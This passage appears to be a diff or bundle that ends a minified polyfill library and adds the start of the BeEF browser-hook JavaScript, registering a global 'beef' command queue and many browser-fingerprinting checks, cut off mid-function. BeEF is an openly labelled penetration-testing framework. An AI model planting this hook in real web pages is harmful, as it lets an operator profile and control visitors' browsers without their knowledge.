Mobile\/\w+)? Safari\//.test(o);r(r.P+r.F*u,"String",{padEnd:function(t){return i(this,t,arguments.length>1?arguments[1]:void 0,!1)}})},function(t,n,e){e(285),t.exports=e(7).String.trimLeft},function(t,n,e){"use strict";e(41)("trimLeft",(function(t){return function(){return t(this,1)}}),"trimStart")},function(t,n,e){e(287),t.exports=e(7).String.trimRight},function(t,n,e){"use strict";e(41)("trimRight",(function(t){return function(){return t(this,2)}}),"trimEnd")},function(t,n,e){e(289),t.exports=e(63).f("asyncIterator")},function(t,n,e){e(97)("asyncIterator")},function(t,n,e){e(291),t.exports=e(7).Object.getOwnPropertyDescriptors},function(t,n,e){var r=e(0),i=e(124),o=e(15),u=e(22),a=e(79);r(r.S,"Object",{getOwnPropertyDescriptors:function(t){for(var n,e,r=o(t),c=u.f,s=i(r),f={},l=0;s.length>l;)void 0!==(e=c(r,n=s[l++]))&&a(f,n,e);return f}})},function(t,n,e){e(293),t.exports=e(7).Object.values},function(t,n,e){var r=e(0),i=e(126)(!1);r(r.S,"Object",{values:function(t){return i(t)}})},function(t,n,e){e(295),t.exports=e(7).Object.entries},function(t,n,e){var r=e(0),i=e(126)(!0);r(r.S,"Object",{entries:function(t){return i(t)}})},function(t,n,e){"use strict";e(118),e(297),t.exports=e(7).Promise.finally},function(t,n,e){"use strict";var r=e(0),i=e(7),o=e(1),u=e(49),a=e(120);r(r.P+r.R,"Promise",{finally:function(t){var n=u(this,i.Promise||o.Promise),e="function"==typeof t;return this.then(e?function(e){return a(n,t()).then((function(){return e}))}:t,e?function(e){return a(n,t()).then((function(){throw e}))}:t)}})},function(t,n,e){e(299),e(300),e(301),t.exports=e(7)},function(t,n,e){var r=e(1),i=e(0),o=e(59),u=[].slice,a=/MSIE .\./.test(o),c=function(t){return function(n,e){var r=arguments.length>2,i=!!r&&u.call(arguments,2);return t(r?function(){("function"==typeof n?n:Function(n)).apply(this,i)}:n,e)}};i(i.G+i.B+i.F*a,{setTimeout:c(r.setTimeout),setInterval:c(r.setInterval)})},function(t,n,e){var r=e(0),i=e(85);r(r.G+r.B,{setImmediate:i.set,clearImmediate:i.clear})},function(t,n,e){for(var r=e(82),i=e(33),o=e(11),u=e(1),a=e(14),c=e(42),s=e(5),f=s("iterator"),l=s("toStringTag"),h=c.Array,d={CSSRuleList:!0,CSSStyleDeclaration:!1,CSSValueList:!1,ClientRectList:!1,DOMRectList:!1,DOMStringList:!1,DOMTokenList:!0,DataTransferItemList:!1,FileList:!1,HTMLAllCollection:!1,HTMLCollection:!1,HTMLFormElement:!1,HTMLSelectElement:!1,MediaList:!0,MimeTypeArray:!1,NamedNodeMap:!1,NodeList:!0,PaintRequestList:!1,Plugin:!1,PluginArray:!1,SVGLengthList:!1,SVGNumberList:!1,SVGPathSegList:!1,SVGPointList:!1,SVGStringList:!1,SVGTransformList:!1,SourceBufferList:!1,StyleSheetList:!0,TextTrackCueList:!1,TextTrackList:!1,TouchList:!1},p=i(d),v=0;v<p.length;v++){var g,y=p[v],m=d[y],b=u[y],S=b&&b.prototype;if(S&&(S[f]||a(S,f,h),S[l]||a(S,l,y),c[y]=h,m))for(g in r)S[g]||o(S,g,r[g],!0)}},function(t,n,e){var r=function(t){"use strict";var n=Object.prototype,e=n.hasOwnProperty,r=Object.defineProperty||function(t,n,e){t[n]=e.value},i="function"==typeof Symbol?Symbol:{},o=i.iterator||"@@iterator",u=i.asyncIterator||"@@asyncIterator",a=i.toStringTag||"@@toStringTag";function c(t,n,e){return Object.defineProperty(t,n,{value:e,enumerable:!0,configurable:!0,writable:!0}),t[n]}try{c({},"")}catch(t){c=function(t,n,e){return t[n]=e}}function s(t,n,e,i){var o=n&&n.prototype instanceof h?n:h,u=Object.create(o.prototype),a=new P(i||[]);return r(u,"_invoke",{value:w(t,e,a)}),u}function f(t,n,e){try{return{type:"normal",arg:t.call(n,e)}}catch(t){return{type:"throw",arg:t}}}t.wrap=s;var l={};function h(){}function d(){}function p(){}var v={};c(v,o,(function(){return this}));var g=Object.getPrototypeOf,y=g&&g(g(O([])));y&&y!==n&&e.call(y,o)&&(v=y);var m=p.prototype=h.prototype=Object.create(v);function b(t){["next","throw","return"].forEach((function(n){c(t,n,(function(t){return this._invoke(n,t)}))}))}function S(t,n){var i;r(this,"_invoke",{value:function(r,o){function u(){return new n((function(i,u){!function r(i,o,u,a){var c=f(t[i],t,o);if("throw"!==c.type){var s=c.arg,l=s.value;return l&&"object"==typeof l&&e.call(l,"__await")?n.resolve(l.__await).then((function(t){r("next",t,u,a)}),(function(t){r("throw",t,u,a)})):n.resolve(l).then((function(t){s.value=t,u(s)}),(function(t){return r("throw",t,u,a)}))}a(c.arg)}(r,o,i,u)}))}return i=i?i.then(u,u):u()}})}function w(t,n,e){var r="suspendedStart";return function(i,o){if("executing"===r)throw new Error("Generator is already running");if("completed"===r){if("throw"===i)throw o;return A()}for(e.method=i,e.arg=o;;){var u=e.delegate;if(u){var a=M(u,e);if(a){if(a===l)continue;return a}}if("next"===e.method)e.sent=e._sent=e.arg;else if("throw"===e.method){if("suspendedStart"===r)throw r="completed",e.arg;e.dispatchException(e.arg)}else"return"===e.method&&e.abrupt("return",e.arg);r="executing";var c=f(t,n,e);if("normal"===c.type){if(r=e.done?"completed":"suspendedYield",c.arg===l)continue;return{value:c.arg,done:e.done}}"throw"===c.type&&(r="completed",e.method="throw",e.arg=c.arg)}}}function M(t,n){var e=n.method,r=t.iterator[e];if(void 0===r)return n.delegate=null,"throw"===e&&t.iterator.return&&(n.method="return",n.arg=void 0,M(t,n),"throw"===n.method)||"return"!==e&&(n.method="throw",n.arg=new TypeError("The iterator does not provide a '"+e+"' method")),l;var i=f(r,t.iterator,n.arg);if("throw"===i.type)return n.method="throw",n.arg=i.arg,n.delegate=null,l;var o=i.arg;return o?o.done?(n[t.resultName]=o.value,n.next=t.nextLoc,"return"!==n.method&&(n.method="next",n.arg=void 0),n.delegate=null,l):o:(n.method="throw",n.arg=new TypeError("iterator result is not an object"),n.delegate=null,l)}function _(t){var n={tryLoc:t[0]};1 in t&&(n.catchLoc=t[1]),2 in t&&(n.finallyLoc=t[2],n.afterLoc=t[3]),this.tryEntries.push(n)}function x(t){var n=t.completion||{};n.type="normal",delete n.arg,t.completion=n}function P(t){this.tryEntries=[{tryLoc:"root"}],t.forEach(_,this),this.reset(!0)}function O(t){if(t){var n=t[o];if(n)return n.call(t);if("function"==typeof t.next)return t;if(!isNaN(t.length)){var r=-1,i=function n(){for(;++r<t.length;)if(e.call(t,r))return n.value=t[r],n.done=!1,n;return n.value=void 0,n.done=!0,n};return i.next=i}}return{next:A}}function A(){return{value:void 0,done:!0}}return d.prototype=p,r(m,"constructor",{value:p,configurable:!0}),r(p,"constructor",{value:d,configurable:!0}),d.displayName=c(p,a,"GeneratorFunction"),t.isGeneratorFunction=function(t){var n="function"==typeof t&&t.constructor;return!!n&&(n===d||"GeneratorFunction"===(n.displayName||n.name))},t.mark=function(t){return Object.setPrototypeOf?Object.setPrototypeOf(t,p):(t.__proto__=p,c(t,a,"GeneratorFunction")),t.prototype=Object.create(m),t},t.awrap=function(t){return{__await:t}},b(S.prototype),c(S.prototype,u,(function(){return this})),t.AsyncIterator=S,t.async=function(n,e,r,i,o){void 0===o&&(o=Promise);var u=new S(s(n,e,r,i),o);return t.isGeneratorFunction(e)?u:u.next().then((function(t){return t.done?t.value:u.next()}))},b(m),c(m,a,"Generator"),c(m,o,(function(){return this})),c(m,"toString",(function(){return"[object Generator]"})),t.keys=function(t){var n=Object(t),e=[];for(var r in n)e.push(r);return e.reverse(),function t(){for(;e.length;){var r=e.pop();if(r in n)return t.value=r,t.done=!1,t}return t.done=!0,t}},t.values=O,P.prototype={constructor:P,reset:function(t){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(x),!t)for(var n in this)"t"===n.charAt(0)&&e.call(this,n)&&!isNaN(+n.slice(1))&&(this[n]=void 0)},stop:function(){this.done=!0;var t=this.tryEntries[0].completion;if("throw"===t.type)throw t.arg;return this.rval},dispatchException:function(t){if(this.done)throw t;var n=this;function r(e,r){return u.type="throw",u.arg=t,n.next=e,r&&(n.method="next",n.arg=void 0),!!r}for(var i=this.tryEntries.length-1;i>=0;--i){var o=this.tryEntries[i],u=o.completion;if("root"===o.tryLoc)return r("end");if(o.tryLoc<=this.prev){var a=e.call(o,"catchLoc"),c=e.call(o,"finallyLoc");if(a&&c){if(this.prev<o.catchLoc)return r(o.catchLoc,!0);if(this.prev<o.finallyLoc)return r(o.finallyLoc)}else if(a){if(this.prev<o.catchLoc)return r(o.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<o.finallyLoc)return r(o.finallyLoc)}}}},abrupt:function(t,n){for(var r=this.tryEntries.length-1;r>=0;--r){var i=this.tryEntries[r];if(i.tryLoc<=this.prev&&e.call(i,"finallyLoc")&&this.prev<i.finallyLoc){var o=i;break}}o&&("break"===t||"continue"===t)&&o.tryLoc<=n&&n<=o.finallyLoc&&(o=null);var u=o?o.completion:{};return u.type=t,u.arg=n,o?(this.method="next",this.next=o.finallyLoc,l):this.complete(u)},complete:function(t,n){if("throw"===t.type)throw t.arg;return"break"===t.type||"continue"===t.type?this.next=t.arg:"return"===t.type?(this.rval=this.arg=t.arg,this.method="return",this.next="end"):"normal"===t.type&&n&&(this.next=n),l},finish:function(t){for(var n=this.tryEntries.length-1;n>=0;--n){var e=this.tryEntries[n];if(e.finallyLoc===t)return this.complete(e.completion,e.afterLoc),x(e),l}},catch:function(t){for(var n=this.tryEntries.length-1;n>=0;--n){var e=this.tryEntries[n];if(e.tryLoc===t){var r=e.completion;if("throw"===r.type){var i=r.arg;x(e)}return i}}throw new Error("illegal catch attempt")},delegateYield:function(t,n,e){return this.delegate={iterator:O(t),resultName:n,nextLoc:e},"next"===this.method&&(this.arg=void 0),l}},t}(t.exports);try{regeneratorRuntime=r}catch(t){"object"==typeof globalThis?globalThis.regeneratorRuntime=r:Function("r","regeneratorRuntime = r")(r)}},function(t,n,e){e(304),t.exports=e(127).global},function(t,n,e){var r=e(305);r(r.G,{global:e(87)})},function(t,n,e){var r=e(87),i=e(127),o=e(306),u=e(308),a=e(315),c=function(t,n,e){var s,f,l,h=t&c.F,d=t&c.G,p=t&c.S,v=t&c.P,g=t&c.B,y=t&c.W,m=d?i:i[n]||(i[n]={}),b=m.prototype,S=d?r:p?r[n]:(r[n]||{}).prototype;for(s in d&&(e=n),e)(f=!h&&S&&void 0!==S[s])&&a(m,s)||(l=f?S[s]:e[s],m[s]=d&&"function"!=typeof S[s]?e[s]:g&&f?o(l,r):y&&S[s]==l?function(t){var n=function(n,e,r){if(this instanceof t){switch(arguments.length){case 0:return new t;case 1:return new t(n);case 2:return new t(n,e)}return new t(n,e,r)}return t.apply(this,arguments)};return n.prototype=t.prototype,n}(l):v&&"function"==typeof l?o(Function.call,l):l,v&&((m.virtual||(m.virtual={}))[s]=l,t&c.R&&b&&!b[s]&&u(b,s,l)))};c.F=1,c.G=2,c.S=4,c.P=8,c.B=16,c.W=32,c.U=64,c.R=128,t.exports=c},function(t,n,e){var r=e(307);t.exports=function(t,n,e){if(r(t),void 0===n)return t;switch(e){case 1:return function(e){return t.call(n,e)};case 2:return function(e,r){return t.call(n,e,r)};case 3:return function(e,r,i){return t.call(n,e,r,i)}}return function(){return t.apply(n,arguments)}}},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n,e){var r=e(309),i=e(314);t.exports=e(89)?function(t,n,e){return r.f(t,n,i(1,e))}:function(t,n,e){return t[n]=e,t}},function(t,n,e){var r=e(310),i=e(311),o=e(313),u=Object.defineProperty;n.f=e(89)?Object.defineProperty:function(t,n,e){if(r(t),n=o(n,!0),r(e),i)try{return u(t,n,e)}catch(t){}if("get"in e||"set"in e)throw TypeError("Accessors not supported!");return"value"in e&&(t[n]=e.value),t}},function(t,n,e){var r=e(88);t.exports=function(t){if(!r(t))throw TypeError(t+" is not an object!");return t}},function(t,n,e){t.exports=!e(89)&&!e(128)((function(){return 7!=Object.defineProperty(e(312)("div"),"a",{get:function(){return 7}}).a}))},function(t,n,e){var r=e(88),i=e(87).document,o=r(i)&&r(i.createElement);t.exports=function(t){return o?i.createElement(t):{}}},function(t,n,e){var r=e(88);t.exports=function(t,n){if(!r(t))return t;var e,i;if(n&&"function"==typeof(e=t.toString)&&!r(i=e.call(t)))return i;if("function"==typeof(e=t.valueOf)&&!r(i=e.call(t)))return i;if(!n&&"function"==typeof(e=t.toString)&&!r(i=e.call(t)))return i;throw TypeError("Can't convert object to primitive value")}},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var e={}.hasOwnProperty;t.exports=function(t,n){return e.call(t,n)}}])}));
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/*!
+ * BeEF JS Library 
+ * Register the BeEF JS on the window object.
+ */
+
+$j = jQuery.noConflict();
+
+if(typeof beef === 'undefined' && typeof window.beef === 'undefined') {
+
+    /**
+     * Register the BeEF JS on the window object.
+     * @namespace {Object} BeefJS 
+     * @property {string} version BeEf Version
+     * @property {boolean} pageIsLoaded This gets set to true during window.onload(). It's a useful hack when messing with document.write().
+     * @property {array} onpopstate An array containing functions to be executed by the window.onpopstate() method.
+     * @property {array} onclose An array containing functions to be executed by the window.onclose() method.
+     * @property {array} commands An array containing functions to be executed by Beef.
+     * @property {array} components An array containing all the BeEF JS components.
+     */
+
+    var BeefJS = {
+        
+        version: '',
+        pageIsLoaded: false,
+        onpopstate: new Array(),
+        onclose: new Array(),
+        commands: new Array(),
+        components: new Array(),
+
+        /**
+         * Adds a function to display debug messages (wraps console.log())
+         * @param: {string} the debug string to return
+         */
+        debug: function(msg) {
+            isDebug = 'false'
+            if (typeof console == "object" && typeof console.log == "function" && isDebug === 'true') {
+                var currentdate = new Date();
+                var pad = function(n){return ("0" + n).slice(-2);}
+                var datetime = currentdate.getFullYear() + "-"
+                + pad(currentdate.getMonth()+1)  + "-"
+                + pad(currentdate.getDate()) + " "
+                + pad(currentdate.getHours()) + ":"
+                + pad(currentdate.getMinutes()) + ":"
+                + pad(currentdate.getSeconds());
+                console.log('['+datetime+'] '+msg);
+            } else {
+                // TODO: maybe add a callback to BeEF server for debugging purposes
+                //window.alert(msg);
+            }
+        },
+
+        /**
+        * Adds a function to execute.
+        * @param: {Function} the function to execute.
+        */
+        execute: function(fn) {
+                if ( typeof  beef.websocket == "undefined"){
+                    this.commands.push(fn);
+                }else{
+                    fn();
+                }
+        },
+
+       /**
+        * Registers a component in BeEF JS.
+        * @params: {String} the component.
+        *
+        * Components are very important to register so the framework does not
+        * send them back over and over again.
+        */
+        regCmp: function(component) {
+                this.components.push(component);
+        }
+
+    };
+
+    window.beef = BeefJS;
+}
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Basic browser functions.
+ * @namespace beef.browser
+ */
+beef.browser = {
+
+    /**
+     * Returns the protocol.
+     * @example: beef.browser.getProtocol()
+     */
+    getProtocol: function() {
+        return document.location.protocol;
+    },
+
+    /**
+     * Returns the user agent that the browser is claiming to be.
+     * @example: beef.browser.getBrowserReportedName()
+     */
+    getBrowserReportedName: function () {
+        return navigator.userAgent;
+    },
+
+    /**
+     * Returns the underlying layout engine in use by the browser.
+     * @example: beef.browser.getBrowserEngine()
+     */
+    getBrowserEngine: function() {
+      try {
+        var engine = platform.layout;
+        if (!!engine)
+          return engine;
+      } catch (e) {}
+      return 'unknown';
+    },
+
+    /**
+     * Returns true if Avant Browser.
+     * @example: beef.browser.isA()
+     */
+    isA: function () {
+        return window.navigator.userAgent.match(/Avant TriCore/) != null;
+    },
+
+    /**
+     * Returns true if Iceweasel.
+     * @example: beef.browser.isIceweasel()
+     */
+    isIceweasel: function () {
+        return window.navigator.userAgent.match(/Iceweasel\/\d+\.\d/) != null;
+    },
+
+    /**
+     * Returns true if Midori.
+     * @example: beef.browser.isMidori()
+     */
+    isMidori: function () {
+        return window.navigator.userAgent.match(/Midori\/\d+\.\d/) != null;
+    },
+
+    /**
+     * Returns true if Odyssey
+     * @example: beef.browser.isOdyssey()
+     */
+    isOdyssey: function () {
+        return (window.navigator.userAgent.match(/Odyssey Web Browser/) != null && window.navigator.userAgent.match(/OWB\/\d+\.\d/) != null);
+    },
+
+    /**
+     * Returns true if Brave
+     * @example: beef.browser.isBrave()
+     */
+    isBrave: function(){
+        return (window.navigator.userAgent.match(/brave\/\d+\.\d/) != null && window.navigator.userAgent.match(/Brave\/\d+\.\d/) != null);
+    },
+
+    /**
+     * Returns true if IE6.
+     * @example: beef.browser.isIE6()
+     */
+    isIE6: function () {
+        return !window.XMLHttpRequest && !window.globalStorage;
+    },
+
+    /**
+     * Returns true if IE7.
+     * @example: beef.browser.isIE7()
+     */
+    isIE7: function () {
+        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
+    },
+
+    /**
+     * Returns true if IE8.
+     * @example: beef.browser.isIE8()
+     */
+    isIE8: function () {
+        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
+    },
+
+    /**
+     * Returns true if IE9.
+     * @example: beef.browser.isIE9()
+     */
+    isIE9: function () {
+        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
+    },
+
+    /**
+     *
+     * Returns true if IE10.
+     * @example: beef.browser.isIE10()
+     */
+    isIE10: function () {
+        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
+    },
+
+    /**
+     *
+     * Returns true if IE11.
+     * @example: beef.browser.isIE11()
+     */
+    isIE11: function () {
+        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
+    },
+
+    /**
+     *
+     * Returns true if Edge.
+     * @example: beef.browser.isEdge()
+     */
+    isEdge: function () {
+        return !beef.browser.isIE() && !!window.styleMedia && (/Edg\/\d+\.\d/.test(window.navigator.userAgent) || /Edge\/\d+\.\d/.test(window.navigator.userAgent));
+    },
+
+    /**
+     * Returns true if IE.
+     * @example: beef.browser.isIE()
+     */
+    isIE: function () {
+        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10() || this.isIE11();
+    },
+
+    /**
+     * Returns true if FF2.
+     * @example: beef.browser.isFF2()
+     */
+    isFF2: function () {
+        return !!window.globalStorage && !window.postMessage;
+    },
+
+    /**
+     * Returns true if FF3.
+     * @example: beef.browser.isFF3()
+     */
+    isFF3: function () {
+        return !!window.globalStorage && !!window.postMessage && !JSON.parse;
+    },
+
+    /**
+     * Returns true if FF3.5.
+     * @example: beef.browser.isFF3_5()
+     */
+    isFF3_5: function () {
+        return !!window.globalStorage && !!JSON.parse && !window.FileReader;
+    },
+
+    /**
+     * Returns true if FF3.6.
+     * @example: beef.browser.isFF3_6()
+     */
+    isFF3_6: function () {
+        return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
+    },
+
+    /**
+     * Returns true if FF4.
+     * @example: beef.browser.isFF4()
+     */
+    isFF4: function () {
+        return !!window.globalStorage && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/4\./) != null;
+    },
+
+    /**
+     * Returns true if FF5.
+     * @example: beef.browser.isFF5()
+     */
+    isFF5: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/5\./) != null;
+    },
+
+    /**
+     * Returns true if FF6.
+     * @example: beef.browser.isFF6()
+     */
+    isFF6: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/6\./) != null;
+    },
+
+    /**
+     * Returns true if FF7.
+     * @example: beef.browser.isFF7()
+     */
+    isFF7: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/7\./) != null;
+    },
+
+    /**
+     * Returns true if FF8.
+     * @example: beef.browser.isFF8()
+     */
+    isFF8: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/8\./) != null;
+    },
+
+    /**
+     * Returns true if FF9.
+     * @example: beef.browser.isFF9()
+     */
+    isFF9: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/9\./) != null;
+    },
+
+    /**
+     * Returns true if FF10.
+     * @example: beef.browser.isFF10()
+     */
+    isFF10: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/10\./) != null;
+    },
+
+    /**
+     * Returns true if FF11.
+     * @example: beef.browser.isFF11()
+     */
+    isFF11: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/11\./) != null;
+    },
+
+    /**
+     * Returns true if FF12
+     * @example: beef.browser.isFF12()
+     */
+    isFF12: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/12\./) != null;
+    },
+
+    /**
+     * Returns true if FF13
+     * @example: beef.browser.isFF13()
+     */
+    isFF13: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/13\./) != null;
+    },
+
+    /**
+     * Returns true if FF14
+     * @example: beef.browser.isFF14()
+     */
+    isFF14: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/14\./) != null;
+    },
+
+    /**
+     * Returns true if FF15
+     * @example: beef.browser.isFF15()
+     */
+    isFF15: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/15\./) != null;
+    },
+
+    /**
+     * Returns true if FF16
+     * @example: beef.browser.isFF16()
+     */
+    isFF16: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/16\./) != null;
+    },
+
+    /**
+     * Returns true if FF17
+     * @example: beef.browser.isFF17()
+     */
+    isFF17: function () {
+        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/17\./) != null;
+    },
+
+    /**
+     * Returns true if FF18
+     * @example: beef.browser.isFF18()
+     */
+    isFF18: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/18\./) != null;
+    },
+
+    /**
+     * Returns true if FF19
+     * @example: beef.browser.isFF19()
+     */
+    isFF19: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/19\./) != null;
+    },
+
+    /**
+     * Returns true if FF20
+     * @example: beef.browser.isFF20()
+     */
+    isFF20: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/20\./) != null;
+    },
+
+    /**
+     * Returns true if FF21
+     * @example: beef.browser.isFF21()
+     */
+    isFF21: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/21\./) != null;
+    },
+
+    /**
+     * Returns true if FF22
+     * @example: beef.browser.isFF22()
+     */
+    isFF22: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/22\./) != null;
+    },
+
+    /**
+     * Returns true if FF23
+     * @example: beef.browser.isFF23()
+     */
+    isFF23: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/23\./) != null;
+    },
+
+    /**
+     * Returns true if FF24
+     * @example: beef.browser.isFF24()
+     */
+    isFF24: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/24\./) != null;
+    },
+
+    /**
+     * Returns true if FF25
+     * @example: beef.browser.isFF25()
+     */
+    isFF25: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/25\./) != null;
+    },
+
+    /**
+     * Returns true if FF26
+     * @example: beef.browser.isFF26()
+     */
+    isFF26: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/26./) != null;
+    },
+
+    /**
+     * Returns true if FF27
+     * @example: beef.browser.isFF27()
+     */
+    isFF27: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && window.navigator.userAgent.match(/Firefox\/27./) != null;
+    },
+
+    /**
+     * Returns true if FF28
+     * @example: beef.browser.isFF28()
+     */
+    isFF28: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt !== 'function' && window.navigator.userAgent.match(/Firefox\/28./) != null;
+    },
+
+    /**
+     * Returns true if FF29
+     * @example: beef.browser.isFF29()
+     */
+    isFF29: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/29./) != null;
+    },
+
+    /**
+     * Returns true if FF30
+     * @example: beef.browser.isFF30()
+     */
+    isFF30: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/30./) != null;
+    },
+
+    /**
+     * Returns true if FF31
+     * @example: beef.browser.isFF31()
+     */
+    isFF31: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/31./) != null;
+    },
+
+    /**
+     * Returns true if FF32
+     * @example: beef.browser.isFF32()
+     */
+    isFF32: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/32./) != null;
+    },
+
+    /**
+     * Returns true if FF33
+     * @example: beef.browser.isFF33()
+     */
+    isFF33: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/33./) != null;
+    },
+
+    /**
+     * Returns true if FF34
+     * @example: beef.browser.isFF34()
+     */
+    isFF34: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/34./) != null;
+    },
+
+    /**
+     * Returns true if FF35
+     * @example: beef.browser.isFF35()
+     */
+    isFF35: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/35./) != null;
+    },
+
+    /**
+     * Returns true if FF36
+     * @example: beef.browser.isFF36()
+     */
+    isFF36: function () {
+        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/36./) != null;
+    },
+
+    /**
+     * Returns true if FF37
+     * @example: beef.browser.isFF37()
+     */
+    isFF37: function () {
